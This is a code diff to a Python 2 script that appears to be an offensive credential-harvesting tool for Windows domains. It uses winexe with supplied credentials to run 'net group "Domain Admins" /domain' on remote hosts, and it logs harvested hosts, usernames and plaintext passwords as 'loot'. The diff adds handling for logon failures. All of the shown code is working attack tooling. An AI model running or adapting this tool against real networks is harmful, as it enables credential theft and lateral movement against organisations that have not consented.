@@ -41,6 +41,8 @@ class colors:
     white = "\033[1;37m"
     green = "\033[1;32m"
 
+class LoginFailure(Exception): pass
+
 #----------------------------------------#
 #               SETUP                    #
 #----------------------------------------#
@@ -174,16 +176,21 @@ def get_das(rhost, username, password, domain):
        
     try:
         print "{}[*]{} Querying domain admin group from {}".format(colors.blue, colors.normal, rhost.rstrip())
-        da_output = subprocess.check_output(split("winexe --system //{} -U {}/{}%{} 'cmd /c net group \"Domain Admins\" /domain'".format(rhost, domain, username, password)))
-        
-        for line in da_output.split('\n')[8:]:
-            if "The command completed" in line:
-                pass
-            else:
-                for da in line.strip().split():
-                    if da:
-                        das.append(da)
-        return das
+        process = subprocess.Popen(split("winexe --system //{} -U {}/{}%{} 'cmd /c net group \"Domain Admins\" /domain'".format(rhost, domain, username, password)), stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        da_output = process.stdout.read()
+        error = process.stderr.read()
+
+        if error and "NT_STATUS_LOGON_FAILURE" in error:
+            return "NT_STATUS_LOGON_FAILURE"
+        else:
+            for line in da_output.split('\n')[8:]:
+                if "The command completed" in line:
+                    pass
+                else:
+                    for da in line.strip().split():
+                        if da:
+                            das.append(da)
+            return das
 
     except Exception as e:
         print "{}[!]{} Unable to reach to {}".format(colors.red, colors.normal, rhost)
@@ -283,10 +290,10 @@ def output(credentials, das):
                         print "{w}[*]{lg} Host: {r} Domain: {d} User: {u} Password: {p}{n}".format(w=colors.white, lg=colors.lightgrey, r=cred[0], d=cred[1], u=cred[2], p=cred[3], n=colors.normal)
                         f.write("[*] Host: {r} Domain: {d} User: {u} Password: {p}\n".format(r=cred[0], d=cred[1], u=cred[2], p=cred[3])) 
                 if da_counter:
-                    print "\n     {y}{dac}{n} domain administrators found and highlighted in yellow above!".format(y=colors.yellow, dac=da_counter, n=colors.normal)
+                    print "\n     {y}{dac}{n} domain administrators found and highlighted in yellow above!\n".format(y=colors.yellow, dac=da_counter, n=colors.normal)
                 return True
         else:
-            print "\n{red}[!]{n} No Loot?! Argh!".format(red=colors.red, n=colors.normal)
+            print "\n{red}[!]{n} No Loot?! Argh!\n".format(red=colors.red, n=colors.normal)
             return False
     except Exception as e:
         print '{red}[!]{n} Error outputting loot. {exc}'.format(red=colors.red, n=colors.normal, exc=e)
@@ -296,7 +303,7 @@ def output(credentials, das):
 #----------------------------------------#
 
 def clean_up(flag, stime):
-    print "\n{}[*]{} Cleaning up".format(colors.blue, colors.normal)
+    print "{}[*]{} Cleaning up".format(colors.blue, colors.normal)
     try:
         if flag: #script completed successfully
             os.remove(os.path.join('/var/www', 'creds.php'))
@@ -305,8 +312,7 @@ def clean_up(flag, stime):
             if os.path.exists(os.path.join(os.getenv('HOME'), 'CCloot')):
                 dirname = os.path.join(os.getenv('HOME'), 'CCloot_{}'.format(datetime.datetime.now().strftime('%Y%m%d_%H:%M:%S')))
                 os.rename('/tmp/CCloot', dirname )
-                os.chmod(dirname, 0700)
-                
+                os.chmod(dirname, 0700)                
             else:
                 dirname = os.path.join(os.getenv('HOME'), 'CCloot')
                 os.rename('/tmp/CCloot', dirname)
@@ -374,13 +380,17 @@ def main():
                     if args.rhost:
                         if validate(args.rhost):
                             das = get_das(args.rhost, args.user, args.passwd, args.domain)
+                            if "NT_STATUS_LOGON_FAILURE" in das:
+                                raise LoginFailure(args.rhost)
                             q.put(args.rhost)
                     if args.file:
                         with open (args.file) as f:
                             lines = [ip.strip() for ip in f.readlines() if ip.strip() and validate(ip.strip())]
                             for line in lines:
                                 das = get_das(line, args.user, args.passwd, args.domain)
-                                if not das: #put the host on a bad list
+                                if "NT_STATUS_LOGON_FAILURE" in das:                                    
+                                    raise LoginFailure(line)
+                                elif not das: #put the host on a bad list
                                     badhost.append(lines[lines.index(line)])
                                 else: #we got our domain admin list
                                     if badhost: #if badhosts, filter before queue
@@ -411,6 +421,9 @@ def main():
         clean_up(False, stime)      
     except IOError:
         print "{}[!]{} File: {} does not exist.".format(colors.red, colors.normal, args.file)
+        clean_up(False, stime)
+    except LoginFailure as e:
+        print "{}[!]{} Login Failure on {}, ensure you have entered the correct credentials\n".format(colors.red, colors.normal, e)
         clean_up(False, stime)
 
 if __name__ == '__main__':
